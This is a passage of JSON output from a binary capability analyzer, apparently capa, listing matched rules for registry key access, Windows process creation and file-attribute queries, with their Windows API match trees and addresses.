                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651782384
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651782425
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create process on Windows": {
        "meta": {
          "name": "create process on Windows",
          "namespace": "host-interaction/process/create",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Create Process"
              ],
              "objective": "Process",
              "behavior": "Create Process",
              "method": "",
              "id": "C0017"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x406DB0",
            "Practical Malware Analysis Lab 01-04.exe_:0x4011FC",
            "692f7fd6d198e804d6af98eb9e390d61:0x6000003"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create process on Windows\r\n    namespace: host-interaction/process/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Process::Create Process [C0017]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x406DB0\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x4011FC\r\n      - 692f7fd6d198e804d6af98eb9e390d61:0x6000003\r\n  features:\r\n    - or:\r\n      - api: kernel32.WinExec\r\n      - api: kernel32.CreateProcess\r\n      - api: shell32.ShellExecute\r\n      - api: shell32.ShellExecuteEx\r\n      - api: advapi32.CreateProcessAsUser\r\n      - api: advapi32.CreateProcessWithLogon\r\n      - api: advapi32.CreateProcessWithToken\r\n      - api: kernel32.CreateProcessInternal\r\n      - api: ntdll.NtCreateUserProcess\r\n      - api: ntdll.NtCreateProcess\r\n      - api: ntdll.NtCreateProcessEx\r\n      - api: ntdll.ZwCreateProcess\r\n      - api: ZwCreateProcessEx\r\n      - api: ntdll.ZwCreateUserProcess\r\n      - api: ntdll.RtlCreateUserProcess\r\n      - api: System.Diagnostics.Process::Start\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651785705
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinExec"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651785843
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecute"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecuteEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessAsUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithLogon"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithToken"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessInternal"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Start"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651798058
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinExec"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651798140
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecute"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecuteEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessAsUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithLogon"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithToken"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessInternal"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Start"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651798463
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinExec"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651798545
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecute"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecuteEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessAsUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithLogon"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithToken"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessInternal"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Start"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get file attributes": {
        "meta": {
          "name": "get file attributes",
          "namespace": "host-interaction/file-system/meta",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Get File Attributes"
              ],
              "objective": "File System",
              "behavior": "Get File Attributes",
              "method": "",
              "id": "C0049"
            }
          ],
          "references": [],
          "examples": [
            "03B236B23B1EC37C663527C1F53AF3FE:0x180019824",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4028B6",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4029E0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get file attributes\r\n    namespace: host-interaction/file-system/meta\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Get File Attributes [C0049]\r\n    examples:\r\n      - 03B236B23B1EC37C663527C1F53AF3FE:0x180019824\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4028B6\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4029E0\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetFileAttributes\r\n      - api: ZwQueryDirectoryFile\r\n      - api: ZwQueryInformationFile\r\n      - api: NtQueryDirectoryFile\r\n      - api: NtQueryInformationFile\r\n      - api: System.IO.File::GetAttributes\r\n      - api: System.IO.File::GetCreationTime\r\n      - api: System.IO.File::GetCreationTimeUtc\r\n      - api: System.IO.File::GetLastAccessTime\r\n      - api: System.IO.File::GetLastAccessTimeUtc\r\n      - api: System.IO.File::GetLastWriteTime\r\n      - api: System.IO.File::GetLastWriteTimeUtc\r\n      - property/read: System.IO.FileSystemInfo::Attributes\r\n      - api: stat\r\n      - api: fstat\r\n      - api: lstat\r\n      - api: fstatat\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651791472
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileAttributes"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791706
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetAttributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileSystemInfo::Attributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "stat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "lstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstatat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651791731
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileAttributes"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791734
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetAttributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileSystemInfo::Attributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "stat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "lstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstatat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651791754
            },
            {
              "success": true,
              "node": {
                "type": "statement",
